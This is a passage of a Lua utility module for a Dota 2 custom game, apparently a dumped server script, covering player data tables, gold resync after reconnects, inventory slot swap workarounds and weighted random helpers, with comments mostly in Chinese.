--[[
  ~ dumper · customs · dota2
  ~ credits: rou (a.k.a internetenemy), qfun(a.k.a qfun_g9s)
  ~ special for t.me/wildguild

  ~ build 7258af9 · 2026-07-23 21:55:46 UTC
  ~ auto-generated — do not edit
]]


if Util == nil then
  _G.Util = class({})
  --全局账户池PlayerData
  --data = PD[ID]
  PD = {
    --房主id
    Host = nil,
    --全局ID池
    IDs = {}
  }
  --重写print
  Print = print
  print = class({})
  setmetatable(print, print)
end

--可以打印表
function print:__call(...)
  --仅开发模式有效
  if not IsInToolsMode() then return end
  if ... == nil then
    Print(nil)
    return
  end
  local args = { ... }
  for i = 1, #args do
    local arg = args[i]
    if type(arg) == "string" or type(arg) == "number" or type(arg) == "function" or type(arg) == "boolean" or arg == nil or type(arg) == "userdata" then
      Print(arg)
    else
      Util:PrintTabWithOutFun(arg)
    end
    --隔断
    if #args > 1 then
      Print("------------------")
    end
  end
end

--在网表ntab中存入一个名为str的handle
function Util:NetIn(str, handle)
  CustomNetTables:SetTableValue("ntab", str, handle)
end

--网表取 在ntab中取出str下的一个handle
function Util:NetOut(str)
  return CustomNetTables:GetTableValue("ntab", str)
end

--寻找所有非观战 非跑路玩家ID  PREGAME阶段
function Util:InitAllPlayers()
  for i = 0, DOTA_MAX_PLAYERS do
    if PlayerResource:IsValidPlayer(i)
        and PlayerResource:GetConnectionState(i) ~=
        DOTA_CONNECTION_STATE_ABANDONED
    then
      self:AddPlayer(i)
    end
  end
end

--第一次出生的时候检查一下自己是否被录入 查一下房主身份
function Util:CheckID(ID)
  if not ID then return end
  if PD[ID] == nil then
    PD[ID] = {}
    table.insert(PD.IDs, ID)
  end

  local hplayer = self:ID2Player(ID)
  if GameRules:PlayerHasCustomGameHostPrivileges(hplayer) then
    PD.Host = ID
  end
end

--刷新未跑路玩家 添加新增玩家（若有），刷新ID池，保留掉线玩家账户
function Util:F5Player()
  for ID = 0, DOTA_MAX_PLAYERS do
    if PlayerResource:IsValidPlayer(ID)
        and PlayerResource:GetConnectionState(ID) ~=
        DOTA_CONNECTION_STATE_ABANDONED
    then
      if PD[ID] == nil then      --若无账户，开设
        PD[ID] = {}
        table.insert(PD.IDs, ID) --非跑路池

        --再找一次房主玩家
        local hplayer = self:ID2Player(ID)
        if GameRules:PlayerHasCustomGameHostPrivileges(hplayer)
        then
          PD.Host = ID
        end
      end
    else
      --跑路的就清掉
      --[[for i=#PD.IDs,1,-1 do
            if PD.IDs[i]==ID then
               table.remove(PD.IDs,i)
            end
          end]]
    end
  end
end

--为有效玩家开设账户，ID存入ID池，并找出房主
function Util:AddPlayer(ID)
  if not ID or not PlayerResource:IsValidPlayer(ID) --观战不计
  then
    return
  end

  if PD[ID] == nil then      --开设名为ID的账户
    PD[ID] = {}
    table.insert(PD.IDs, ID) --所有玩家ID存在IDs中，仅第一次计
  end

  local hplayer = self:ID2Player(ID) --找到房主ID
  if GameRules:PlayerHasCustomGameHostPrivileges(hplayer) then
    PD.Host = ID
  end
end

--账户的存入 k string number table entity handle
function Util:DataIn(ID, k, v)
  if not ID or not type(ID) == "number" then return end
  if self:ID2Player(ID) and PD[ID] then
    PD[ID][k] = v
  end
end

--账户的取出  返回 value 任意类型
function Util:DataOut(ID, k)
  if not ID or not type(ID) == "number" then return end
  if self:ID2Player(ID) and PD[ID] then
    return PD[ID][k]
  end
end

--------------------------------------------------------------------
--ID 转 在线玩家实体 返回handle
function Util:ID2Player(ID)
  if not ID then return false end
  if self:IsPseudoPlayerID(ID) then
    return false
  end
  if PlayerResource:IsValidPlayer(ID) then
    return PlayerResource:GetPlayer(ID)
  end
end

function Util:IsPseudoPlayerID(ID)
  if type(ID) ~= "number" then return false end
  if PD and PD[ID] and PD[ID].pseudo_player then
    return true
  end
  if InitPlayer and InitPlayer.GetPlayerData then
    local data = InitPlayer:GetPlayerData(ID)
    if data and data.bot then
      return true
    end
  end
  return false
end

--ID转指定英雄实体 返回handle
function Util:ID2Hero(ID)
  if not ID then return false end
  if self:IsPseudoPlayerID(ID) then
    local data = PD[ID]
    if data and data.pseudo_hero and not data.pseudo_hero:IsNull() then
      return data.pseudo_hero
    end
    return
  end
  if PlayerResource == nil then return end
  if PlayerResource:IsValidPlayer(ID) then
    local player = PlayerResource:GetPlayer(ID)
    if player then
      return player:GetAssignedHero()
    end
    -- 断线时无 HPlayer；本图提前 HeroData:SetHeroIndex 或引擎仍可能有 SelectedHero
    if HeroData and HeroData.GetHero then
      local h = HeroData:GetHero(ID)
      if h and not h:IsNull() then
        return h
      end
    end
    if PlayerResource.GetSelectedHeroEntity then
      local h2 = PlayerResource:GetSelectedHeroEntity(ID)
      if h2 and not h2:IsNull() then
        return h2
      end
    end
  end
  -- IsValidPlayer 为 false 时上面整块未走，仍用本图 hero_index 或引擎选中实体
  if HeroData and HeroData.GetHero then
    local h = HeroData:GetHero(ID)
    if h and not h:IsNull() then
      return h
    end
  end
  if PlayerResource and PlayerResource.GetSelectedHeroEntity then
    local h2 = PlayerResource:GetSelectedHeroEntity(ID)
    if h2 and not h2:IsNull() then
      return h2
    end
  end
end

--- 掉线后 `GetAssignedHero` 常为 nil；用 `HeroData.hero_index` / 异步出真缓存回退
function Util:GetHeroForPlayerData(ID)
  if not ID then return end
  local hero = self:ID2Hero(ID)
  if hero and not hero:IsNull() then return hero end
  if PD and PD[ID] and PD[ID].clrb_dc_hero then
    hero = PD[ID].clrb_dc_hero
    if hero and not hero:IsNull() then return hero end
  end
  if HeroData and HeroData.GetHero then
    hero = HeroData:GetHero(ID)
    if hero and not hero:IsNull() then return hero end
  end
end

--- 复活无敌（modifier_wudi）：真人任意操作（下单、背包挪移等）后移除；依赖 hero._clrb_respawn_wudi_break，人机不挂该标记
function Util:TryClearRespawnProtectionWudi(hero)
  if not hero or hero:IsNull() then
    return
  end
  if type(hero.IsRealHero) ~= "function" or not hero:IsRealHero() then
    return
  end
  if not hero._clrb_respawn_wudi_break then
    return
  end
  local pid = hero.GetPlayerOwnerID and hero:GetPlayerOwnerID()
  if pid == nil or pid < 0 or self:IsPseudoPlayerID(pid) then
    return
  end
  if PlayerResource == nil or rawget(PlayerResource, "IsPlayerBot") == nil then
    return
  end
  local okb, isbot = pcall(function()
    return PlayerResource:IsPlayerBot(pid)
  end)
  if not okb or isbot then
    return
  end
  if hero:HasModifier("modifier_wudi") then
    hero:RemoveModifierByName("modifier_wudi")
  end
  hero._clrb_respawn_wudi_break = nil
end

local CLRB_NEUTRAL_CHEST_ITEM = "item_cost_2"
local CLRB_NEUTRAL_CHEST_SLOT = 16

local function clrb_is_talent_skill_item(it)
    if not it or it:IsNull() or not it.GetName then
        return false
    end
    return string.match(it:GetName(), "^item_talent_skill_%d+$") ~= nil
end

local function clrb_talent_tp_slot()
    return tonumber(rawget(_G, "DOTA_ITEM_TP_SLOT")) or 15
end

local function clrb_is_locked_talent_tp_slot(slot)
    return slot ~= nil and slot == clrb_talent_tp_slot()
end
local CLRB_ULTIMATE_SCEPTER_ITEMS = {
    item_ultimate_scepter = true,
    item_ultimate_scepter_2 = true,
    item_ultimate_scepter_roshan = true,
}
local CLRB_AGHANIM_SHARD_NAME = "item_aghanims_shard"

local function clrb_is_ultimate_scepter_item(it)
    if not it or it:IsNull() or not it.GetName then
        return false
    end
    return CLRB_ULTIMATE_SCEPTER_ITEMS[it:GetName()] == true
end

local function clrb_slot_has_ultimate_scepter(hero, slot)
    if not hero or hero:IsNull() or slot == nil then
        return false
    end
    local it = hero.GetItemInSlot and hero:GetItemInSlot(slot)
    return clrb_is_ultimate_scepter_item(it)
end

local function clrb_is_neutral_chest_item(it)
    if not it or it:IsNull() or not it.GetName then
        return false
    end
    return it:GetName() == CLRB_NEUTRAL_CHEST_ITEM
end

local function clrb_is_locked_chest_slot(slot)
    return slot == CLRB_NEUTRAL_CHEST_SLOT
end

local function clrb_is_neutral_item_slot(slot)
    if clrb_is_locked_chest_slot(slot) then
        return true
    end
    if slot == nil or type(slot) ~= "number" then
        return false
    end
    local neutral_slots = {
        tonumber(rawget(_G, "DOTA_ITEM_NEUTRAL_SLOT")),
        tonumber(rawget(_G, "DOTA_ITEM_NEUTRAL_ACTIVE_SLOT")),
        tonumber(rawget(_G, "DOTA_ITEM_NEUTRAL_PASSIVE_SLOT")),
        14, 15, 17, 18,
    }
    for _, neutral_slot in ipairs(neutral_slots) do
        if neutral_slot ~= nil and slot == neutral_slot then
            return true
        end
    end
    return false
end

local function clrb_swap_pair_should_skip(hero, slot_a, slot_b)
    if clrb_is_locked_chest_slot(slot_a) or clrb_is_locked_chest_slot(slot_b) then
        return true
    end
    if clrb_is_locked_talent_tp_slot(slot_a) or clrb_is_locked_talent_tp_slot(slot_b) then
        return true
    end
    local it_a = hero.GetItemInSlot and hero:GetItemInSlot(slot_a)
    local it_b = hero.GetItemInSlot and hero:GetItemInSlot(slot_b)
    if clrb_is_neutral_chest_item(it_a) or clrb_is_neutral_chest_item(it_b) then
        return true
    end
    if clrb_is_talent_skill_item(it_a) or clrb_is_talent_skill_item(it_b) then
        return true
    end
    if it_a and not it_a:IsNull() and it_a.GetItemSlot then
        local s = it_a:GetItemSlot()
        if clrb_is_locked_chest_slot(s) then
            return true
        end
    end
    if it_b and not it_b:IsNull() and it_b.GetItemSlot then
        local s = it_b:GetItemSlot()
        if clrb_is_locked_chest_slot(s) then
            return true
        end
    end
    return false
end

--- 换位目标格若含阿哈利姆神杖则换用其它主栏格；0/1/2 为优先备选。
local function clrb_pick_swap_target_avoid_scepter(hero, other_slot, preferred)
    if not hero or hero:IsNull() then
        return nil
    end
    local candidates = {}
    local seen = {}
    local function push(s)
        if s == nil or type(s) ~= "number" or s < 0 or s > 5 or seen[s] then
            return
        end
        seen[s] = true
        table.insert(candidates, s)
    end
    if preferred ~= nil then
        push(preferred)
    end
    for slot = 0, 5 do
        if not hero:GetItemInSlot(slot) then
            push(slot)
        end
    end
    for _, s in ipairs({ 0, 1, 2 }) do
        push(s)
    end
    for slot = 0, 5 do
        push(slot)
    end
    for _, target in ipairs(candidates) do
        if not clrb_is_locked_chest_slot(target)
            and not clrb_swap_pair_should_skip(hero, other_slot, target)
            and not clrb_slot_has_ultimate_scepter(hero, target) then
            return target
        end
    end
    return nil
end

--- 除开局 TryPlaceItemCost2InNeutralSlot 外，所有程序化换位均不得涉及 16 号槽。
local function clrb_hero_safe_swap_items(hero, slot_a, slot_b)
    if not hero or hero:IsNull() or not hero.SwapItems then
        return false
    end
    if clrb_swap_pair_should_skip(hero, slot_a, slot_b) then
        return false
    end
    pcall(function()
        hero:SwapItems(slot_a, slot_b)
    end)
    return true
end

--- 复活后若 6–8 任一槽有道具：与各自主栏槽做两次换位（恢复原布局），逼引擎重算背包内物品的生效状态。
--- 配对：背包 6↔主栏 3；背包 7↔主栏 4；背包 8↔主栏 5。
local function clrb_backpack_double_swap_nudge(hero)
    if not hero or hero:IsNull() or not hero.SwapItems then
        return
    end
    local has_backpack_item = false
    for slot = 6, 8 do
        local it = hero.GetItemInSlot and hero:GetItemInSlot(slot)
        if it and not it:IsNull() then
            has_backpack_item = true
            break
        end
    end
    if not has_backpack_item then
        return
    end
    local function swap_pair_twice(backpack_slot, preferred_main)
        local target = clrb_pick_swap_target_avoid_scepter(hero, backpack_slot, preferred_main)
        if target == nil then
            return
        end
        if clrb_swap_pair_should_skip(hero, backpack_slot, target) then
            return
        end
        if not hero:GetItemInSlot(backpack_slot) and not hero:GetItemInSlot(target) then
            return
        end
        clrb_hero_safe_swap_items(hero, backpack_slot, target)
        clrb_hero_safe_swap_items(hero, backpack_slot, target)
    end
    swap_pair_twice(6, 3)
    swap_pair_twice(7, 4)
    swap_pair_twice(8, 5)
end

local function clrb_extended_stash_double_swap_nudge(hero, item, stash_slot)
    if not hero or hero:IsNull() or not hero.SwapItems or not item or item:IsNull() then
        return
    end
    if stash_slot == nil or stash_slot < 9 or stash_slot > 11 then
        return
    end
    local it = hero.GetItemInSlot and hero:GetItemInSlot(stash_slot)
    if not it or it:IsNull() or it ~= item then
        return
    end
    local target = clrb_pick_swap_target_avoid_scepter(hero, stash_slot, nil)
    if target == nil then
        return
    end
    if clrb_swap_pair_should_skip(hero, stash_slot, target) or clrb_is_neutral_chest_item(item) then
        return
    end
    clrb_hero_safe_swap_items(hero, stash_slot, target)
    clrb_hero_safe_swap_items(hero, stash_slot, target)
end

local function clrb_hero_item_in_slots_hero(hero, slot_lo, slot_hi, name_predicate)
    for slot = slot_lo, slot_hi do
        local it = hero.GetItemInSlot and hero:GetItemInSlot(slot)
        if it and not it:IsNull() and it.GetName then
            local nm = it:GetName()
            if nm and name_predicate(nm) then
                return true
            end
        end
    end
    return false
end

local function clrb_strip_aghanims_modifiers_if_only_backpack(hero)
    if not hero or hero:IsNull() then
        return
    end
    local pid = hero.GetPlayerOwnerID and hero:GetPlayerOwnerID()
    if pid == nil or pid < 0 or Util:IsPseudoPlayerID(pid) then
        return
    end
    if PlayerResource and rawget(PlayerResource, "IsPlayerBot") ~= nil then
        local ok, isb = pcall(function()
            return PlayerResource:IsPlayerBot(pid)
        end)
        if ok and isb then
            return
        end
    end
    local function is_scepter(nm)
        return CLRB_ULTIMATE_SCEPTER_ITEMS[nm] == true
    end
    local function is_shard(nm)
        return nm == CLRB_AGHANIM_SHARD_NAME
    end
    local has_main_or_neutral_scepter = clrb_hero_item_in_slots_hero(hero, 0, 5,
        is_scepter) or clrb_hero_item_in_slots_hero(hero, 16, 16, is_scepter)
    local has_backpack_only_scepter = not has_main_or_neutral_scepter
        and clrb_hero_item_in_slots_hero(hero, 6, 8, is_scepter)
    local has_main_shard = clrb_hero_item_in_slots_hero(hero, 0, 5, is_shard)
        or clrb_hero_item_in_slots_hero(hero, 16, 16, is_shard)
    local has_backpack_only_shard = not has_main_shard
        and clrb_hero_item_in_slots_hero(hero, 6, 8, is_shard)
    if hero.HasModifier and hero.RemoveModifierByName then
        if has_backpack_only_scepter and hero:HasModifier("modifier_item_ultimate_scepter") then
            hero:RemoveModifierByName("modifier_item_ultimate_scepter")
        end
        if has_backpack_only_shard and hero:HasModifier("modifier_item_aghanims_shard") then
            hero:RemoveModifierByName("modifier_item_aghanims_shard")
        end
    end
end

function Util:ClrbFixBackpackPassivesAfterInventoryResync(hero)
    if not hero or hero:IsNull() then
        return
    end
    if type(hero.IsHero) ~= "function" or not hero:IsHero() then
        return
    end
    clrb_backpack_double_swap_nudge(hero)
    clrb_strip_aghanims_modifiers_if_only_backpack(hero)
    if hero.CalculateStatBonus then
        pcall(function()
            hero:CalculateStatBonus(true)
        end)
    end
end

--- 程序化拾取（宠物 AddItem 等）进 6–11 储藏格后常无法直接卖店；补 purchaser 并做一次背包换位 nudge（与手动拖格等价）。
function Util:ClrbFixPickupItemSellable(hero, item)
    if not hero or hero:IsNull() or not item or item:IsNull() then
        return
    end
    if type(hero.IsHero) ~= "function" or not hero:IsHero() then
        return
    end
    Timers:CreateTimer(0, function()
        if not hero or hero:IsNull() or not item or item:IsNull() then
            return
        end
        pcall(function()
            if item.SetPurchaser then
                item:SetPurchaser(hero)
            end
        end)
        local slot = nil
        if item.GetItemSlot then
            local ok, s = pcall(function()
                return item:GetItemSlot()
            end)
            if ok then
                slot = s
            end
        end
        if slot ~= nil and clrb_is_locked_chest_slot(slot) then
            return
        end
        if slot ~= nil and clrb_is_locked_talent_tp_slot(slot) then
            return
        end
        if clrb_is_neutral_chest_item(item) or clrb_is_talent_skill_item(item) then
            return
        end
        if slot ~= nil and slot >= 6 and slot <= 8 then
            Util:ClrbFixBackpackPassivesAfterInventoryResync(hero)
        elseif slot ~= nil and slot >= 9 and slot <= 11 then
            clrb_extended_stash_double_swap_nudge(hero, item, slot)
        end
    end)
end

--ID转AID 返回string
function Util:ID2Aid(ID)
  if not ID then return false end
  local player = self:ID2Player(ID)
  if not player then return end
  local Aid = self:Player2Aid(player)
  return Aid
end

--ID转Sid 返回string
function Util:ID2Sid(ID)
  if not ID then return false end
  if ReloadGame:GetPlayerSid(ID) then
    return ReloadGame:GetPlayerSid(ID)
  end
  local player = self:ID2Player(ID)
  if not player then return end
  local Sid = self:Player2Sid(player)
  return Sid
end

--ID修改金币
function Util:ID2MGold(ID, count)
  if ID and count
      and type(ID) == "number"
      and type(count) == "number" then
    PlayerResource:ModifyGold(ID, count,
      false, DOTA_ModifyGold_Unspecified)
  end
end

--ID查询在线状态
function Util:ID2State(ID)
  if not ID or not PlayerResource then
    return
  end
  if not PlayerResource:IsValidPlayer(ID) then
    return
  end
  return PlayerResource:GetConnectionState(ID)
end

--玩家状态
--DOTA_CONNECTION_STATE_UNKNOWN  0
--DOTA_CONNECTION_STATE_CONNECTED     --在线  2
--DOTA_CONNECTION_STATE_NOT_YET_CONNECTED
--DOTA_CONNECTION_STATE_DISCONNECTED  --特别注意：掉线后获取不到ID，也拿不到英雄 3
--DOTA_CONNECTION_STATE_ABANDONED     --彻底断开 4
--DOTA_CONNECTION_STATE_LOADING
--DOTA_CONNECTION_STATE_FAILED

--ID判断是否在线 bool
function Util:ID2IfOnline(ID)
  if not ID then return false end
  if self:IsPseudoPlayerID(ID) then
    return true
  end
  if not PlayerResource or not PlayerResource:IsValidPlayer(ID) then
    return false
  end
  if PlayerResource:GetConnectionState(ID) ==
      DOTA_CONNECTION_STATE_CONNECTED then
    return true
  else
    return false
  end
end

--- 重连后强制把服务端 PlayerResource 金币推给客户端 HUD（断线随机出英雄时首连常显示 0 但可购物）
function Util:ClrbResyncPlayerResourceGold(ID)
  if not ID or ID < 0 or self:IsPseudoPlayerID(ID) then
    return
  end
  if not PlayerResource or not PlayerResource.IsValidPlayer or not PlayerResource:IsValidPlayer(ID) then
    return
  end
  if not PlayerResource.SetGold then
    return
  end

  local rel = 0
  local unrel = 0
  if PlayerResource.GetReliableGold then
    rel = PlayerResource:GetReliableGold(ID) or 0
  end
  if PlayerResource.GetUnreliableGold then
    unrel = PlayerResource:GetUnreliableGold(ID) or 0
  end
  if rel == 0 and unrel == 0 and PlayerResource.GetGold then
    rel = PlayerResource:GetGold(ID) or 0
  end

  pcall(function()
    PlayerResource:SetGold(ID, rel, true)
    PlayerResource:SetGold(ID, unrel, false)
  end)

  local hero = PlayerResource.GetSelectedHeroEntity and PlayerResource:GetSelectedHeroEntity(ID)
  if (not hero or hero:IsNull()) and self.GetHeroForPlayerData then
    hero = self:GetHeroForPlayerData(ID)
  end
  if (not hero or hero:IsNull()) and HeroData and HeroData.GetHero then
    hero = HeroData:GetHero(ID)
  end
  if hero and not hero:IsNull() and hero.SetGold then
    pcall(function()
      hero:SetGold(rel, true)
      hero:SetGold(unrel, false)
    end)
  end

  if hero and not hero:IsNull() and PlayerResource.SetOverrideSelectionEntity then
    pcall(function()
      PlayerResource:SetOverrideSelectionEntity(ID, hero)
    end)
  end

  if PlayerResource.ModifyGold then
    local reason = tonumber(rawget(_G, "DOTA_ModifyGold_Unspecified")) or 0
    pcall(function()
      PlayerResource:ModifyGold(ID, 1, false, reason)
      PlayerResource:ModifyGold(ID, -1, false, reason)
    end)
  end
end

--- 清零后重新 ModifyGold，触发客户端金币变更事件（SetGold 在首连时可能无效）
function Util:ClrbForcePlayerGoldResync(ID, saved_total)
  if not ID or ID < 0 or self:IsPseudoPlayerID(ID) then
    return
  end
  if not PlayerResource or not PlayerResource.IsValidPlayer or not PlayerResource:IsValidPlayer(ID) then
    return
  end
  local total = saved_total
  if total == nil and PlayerResource.GetGold then
    total = PlayerResource:GetGold(ID) or 0
  end
  total = tonumber(total) or 0
  pcall(function()
    PlayerResource:SetGold(ID, 0, true)
    PlayerResource:SetGold(ID, 0, false)
  end)
  if total > 0 and PlayerResource.ModifyGold then
    local reason = tonumber(rawget(_G, "DOTA_ModifyGold_Unspecified")) or 0
    pcall(function()
      PlayerResource:ModifyGold(ID, total, false, reason)
    end)
  end
  self:ClrbResyncPlayerResourceGold(ID)
  self:ClrbSchedulePlayerGoldResync(ID)
end

--- 重连后分多帧补推金币，避免 CPlayer/英雄尚未绑完时 SetGold 无效
function Util:ClrbSchedulePlayerGoldResync(ID)
  if not ID or ID < 0 or self:IsPseudoPlayerID(ID) then
    return
  end
  if not Timers then
    self:ClrbResyncPlayerResourceGold(ID)
    return
  end
  local prefix = "clrb_gold_resync_" .. tostring(ID) .. "_"
  for _, delay in ipairs({ 0, 0.35, 0.75, 1.5, 3, 5 }) do
    Timers:CreateTimer(prefix .. tostring(delay), {
      endTime = delay,
      callback = function()
        if PlayerResource and PlayerResource.IsValidPlayer and PlayerResource:IsValidPlayer(ID) then
          Util:ClrbResyncPlayerResourceGold(ID)
        end
      end,
    })
  end
end

--ID判断是否离开 bool
function Util:ID2IfLeave(ID)
  if not ID then return false end
  if self:IsPseudoPlayerID(ID) then
    return false
  end
  if not PlayerResource or not PlayerResource:IsValidPlayer(ID) then
    return false
  end
  if PlayerResource:GetConnectionState(ID) ==
      DOTA_CONNECTION_STATE_ABANDONED then
    return true
  else
    return false
  end
end

--ID判断是否有效 bool
function Util:ID2IfValid(ID)
  if not ID then return false end
  if self:IsPseudoPlayerID(ID) then
    return true
  end
  if PlayerResource:IsValidPlayer(ID) then
    return true
  else
    return false
  end
end

--------------------------------------------------------------------
--英雄实体 转 操纵的玩家实体  返回handle
function Util:Hero2Player(hero)
  if not hero then return false end
  if hero:IsHero() and not hero:IsNull() then
    local player = hero:GetPlayerOwner()
    return player
  end
end

--英雄实体 转 ID  返回 number
function Util:Hero2ID(hero)
  if not hero then return end
  if hero:IsNull() then return end
  if hero.pseudo_player_id ~= nil then
    return hero.pseudo_player_id
  end
  if hero.iscreateillusions ~= nil then
    return hero:GetPlayerOwnerID()
  end
  if not hero.IsRealHero then return end
  if not hero:IsRealHero() then return end
  return hero:GetPlayerOwnerID()
end

-- 会走 HeroData / 肉搏等玩家表的本体英雄（排除幻象、非 RealHero）
function Util:IsPlayerHeroForData(unit)
  if not unit or unit:IsNull() or not unit:IsHero() then return false end
  if unit:IsIllusion() then return false end
  if not unit:IsRealHero() then return false end
  return true
end

--- 是否为「非本体」可复制英雄分身：幻象 / 宙斯盾分身等；仅服务端处理
local function Util_clrb_strip_illusion_or_double(unit)
  if not unit or unit:IsNull() or not unit:IsHero() then
    return false
  end
  if unit:IsIllusion() then
    return true
  end
  if unit.IsTempestDouble then
    local ok, td = pcall(function()
      return unit:IsTempestDouble()
    end)
    if ok and td then
      return true
    end
  end
  return false
end

--- 幻象/分身仅存引擎继承的战斗属性与普通攻击，不参与肉搏击技能格子；降生后多次延迟摘掉 Ability，避免引擎晚挂技能与其它注册竞争
function Util:ApplyIllusionHeroNoAbilitiesRule(unit)
  if not IsServer() then
    return
  end
  if not Util_clrb_strip_illusion_or_double(unit) then
    return
  end
  local u = unit
  local pass = 0
  local function sweep()
    pass = pass + 1
    if not u or u:IsNull() or not u:IsAlive() or not Util_clrb_strip_illusion_or_double(u) then
      return
    end
    for i = u:GetAbilityCount() - 1, 0, -1 do
      local ab = u:GetAbilityByIndex(i)
      if ab and not ab:IsNull() then
        local nm = ab:GetAbilityName()
        if nm and nm ~= "" then
          pcall(function()
            if u:HasAbility(nm) then
              u:RemoveAbility(nm)
            end
          end)
        end
      end
    end
    -- 多扫几帧：引擎偶在降生后短时间再挂一批技能
    local delay_next = ({ [1] = 0.06, [2] = 0.18 })[pass]
    if delay_next and pass < 3 then
      Timers(delay_next, sweep)
    end
  end
  Timers(0, sweep)
end

--英雄实体 转 主要属性
function Util:Hero2Type(hero)
  if not hero or not hero:IsHero() then return false end
  local ty = hero:GetPrimaryAttribute()
  if ty == DOTA_ATTRIBUTE_STRENGTH then
    return 0
  elseif ty == DOTA_ATTRIBUTE_AGILITY then
    return 1
  elseif ty == DOTA_ATTRIBUTE_INTELLECT then
    return 2
  else
    return 3
  end
end

--英雄转主要属性
function Util:Hero2Attribute(hero)
  local Att = self:Hero2Type(hero)
  if Att == 0 then
    return hero:GetStrength()
  elseif Att == 1 then
    return hero:GetAgility()
  elseif Att == 2 then
    return hero:GetIntellect(false)
  end
end

--英雄实体是否准备接收操作
function Util:HeroIfReady(hero)
  if not hero or not hero:IsHero() then return false end
  if hero:IsAlive() and not hero:IsNull() then
    return true
  else
    return false
  end
end

--------------------------------------------------------------------
--有效玩家实体 转 ID 返回 number
function Util:Player2ID(hplayer)
  if not hplayer then return false end
  local ID = hplayer:GetPlayerID()
  if PlayerResource:IsValidPlayer(ID) then
    return ID
  end
end

--玩家实体 转英雄实体 返回handle
function Util:Player2Hero(hplayer)
  if not hplayer then return false end
  if not hplayer.GetAssignedHero then return end
  local hero = hplayer:GetAssignedHero()
  return hero
end

--玩家实体 转 账户ID  返回 string 239921767
function Util:Player2Aid(hplayer)
  if not hplayer then return false end
  if not IsValidEntity(hplayer) then return end
  local ID = hplayer:GetPlayerID()
  if PlayerResource:IsValidPlayer(ID) then
    local Aid = PlayerResource:GetSteamAccountID(ID)
    local str = tostring(Aid)
    return str
  end
end

--玩家实体 转 steamID  返回 string 76561198200187495
function Util:Player2Sid(hplayer)
  if not hplayer then return false end
  local ID = hplayer:GetPlayerID()
  if PlayerResource:IsValidPlayer(ID) then
    local Sid = PlayerResource:GetSteamID(ID)
    local str = tostring(Sid)
    return str
  end
end

--玩家实体修改金币
function Util:Player2MGold(hplayer, count)
  if hplayer and count
      and type(hplayer) == "table"
      and type(count) == "number" then
    local ID = Util:Player2ID(hplayer)
    if not ID then return end
    PlayerResource:ModifyGold(ID, count,
      false, DOTA_ModifyGold_Unspecified)
  end
end

--------------------------------------------------------------------
--实体转索引
function Util:Entity2Index(entity)
  if entity then
    return entity:GetEntityIndex()
  end
end

--索引转实体
function Util:Index2Entity(index)
  if index then
    return EntIndexToHScript(index)
  end
end

--字符名字转实体
function Util:String2Entity(string)
  if string and type(string) == "string" then
    return Entities:FindByName(nil, string)
  end
end

--实体及对应C++实体是否空
function Util:EntityIfNill(entity)
  if entity and type(entity) == "table" and not entity:IsNull()
  then
    return true
  else
    return false
  end
end

--击杀entity
function Util:Entity2Kill(entity)
  if not entity or type(entity) ~= "table" then return end
  if entity.ForceKill then
    entity:AddNoDraw()
    entity:ForceKill(false)
  else
    entity:RemoveSelf()
  end
end

----------------------------------------------------------------
--半径转敌人
function Util:Radius2Enemy(ca, radius)
  if not ca or type(ca) ~= "table" then return end
  if radius == nil then radius = RandomInt(300, 400) end
  local enemy = FindUnitsInRadius(
    ca:GetTeamNumber(),
    ca:GetAbsOrigin(),
    nil,
    radius,
    DOTA_UNIT_TARGET_TEAM_ENEMY,
    DOTA_UNIT_TARGET_HERO + DOTA_UNIT_TARGET_BASIC,
    DOTA_UNIT_TARGET_FLAG_MAGIC_IMMUNE_ENEMIES,
    FIND_CLOSEST,
    false)
  return enemy
end

--应用伤害
function Util:ApplyDamage(at, vi, da, ty, ab)
  if ty == nil then ty = DAMAGE_TYPE_PHYSICAL end
  local tab = {
    attacker = at,
    victim = vi,
    damage = da,
    damage_type = ty,
    ability = ab,
  }
  ApplyDamage(tab)
end

--所有在线玩家
function Util:NoAbandonedIDs()
  local tab = {}
  for i = 1, #PD.IDs do
    local ID = PD.IDs[i]
    if self:ID2IfOnline(ID) then table.insert(tab, ID) end
  end
  return tab
end

------------------------------------------------
--[[
script_reload
tab={
   a=200,
   b=300,
   c=5,
   d=30
}
权重随机 左边是项目，右边是权重
]]
function Util:Weight(tab)
  local left = {}
  local right = {}
  for k, v in pairs(tab) do
    table.insert(left, k)
    if type(v) == "string" then
      tonumber(v)
    end
    table.insert(right, v * 10000)
  end
  --[[
   left={"a","b","c","d"}
   right={200,300,5,30}
   ]]
  local temp = {}
  local all = 0
  for k, v in pairs(right) do
    all = all + v
    table.insert(temp, all)
  end
  --[[
     temp={200,500,505,535}
     all=535
   ]]
  --local Int = RandomInt(1, all)
  local Int = math.floor(Script_RandomFloat(1, all + 1))
  for k, v in pairs(temp) do
    if Int <= v then
      return left[k]
    end
  end
end

--权重随机 表 和 权重分开写
--权重是一个数组
--[[
a={"a","b","c","d"}
b={100,200,20,30}
Util:Weight2(a,b)
]]
function Util:Weight2(t, weights)
  local sum = 0
  for i = 1, #weights do
    sum = sum + weights[i]
  end
  local compareWeight = Script_RandomFloat(1, sum)
  local weightIndex = 1
  while sum > 0 do
    sum = sum - weights[weightIndex]
    if sum < compareWeight then
      return t[weightIndex]
    end
    weightIndex = weightIndex + 1
  end
  return nil
end

--获取NPC目录下的txt文件
--kv对里的数值 加不加引号都是number
--键加不加引号都是string
--[[
  "物品掉落"{
    "大刀"  "20"
    "小刀"  "30"
    "飞机"  "20"
    "大炮"  "30"
    "坦克"  "20"
    "小鸟"  "30"
    "Version" "1"
}
]]
function Util:GetKv(name)
  if type(name) ~= "string" then return end
  local path = "scripts/npc/" .. name .. ".txt"
  local tab = LoadKeyValues(path)
  local tab2 = {}
  for k, v in pairs(tab) do
    if k ~= "Version" then
      tab2[k] = v
    end
  end
  return tab2
end

--发送一个左边显示的信息
function Util:SendMsg(msg, id, value, team)
  if team == nil then team = -1 end
  local event = {
    player_id = id,
    int_value = value,
    teamnumber = team,
    message = msg,
  }
  FireGameEvent("dota_combat_event_message", event)
  --InforMsg:SendMsg(id, msg, "normal")
end

--将tab用某个字符连接
function Util:Tab2Str(tab, symbol)
  local str = ""
  for k, v in pairs(tab) do
    str = str .. tostring(k) .. tostring(v) .. symbol
  end
  return str
end

--拼接的字符串 转成一个表
--[[
    Util:Split("前半截,后半截",",")
]]
function Util:SplitLong(str, symbol)
  if str == nil or str == "" or symbol == nil then
    return
  end
  local tab = {}
  for match in (str .. symbol):gmatch("(.-)" .. symbol) do
    table.insert(tab, match)
  end
  return tab
end

--这个效率高一些
function Util:Split(str, symbol)
  if not str or str == "" or not symbol or symbol == "" then
    return {}
  end
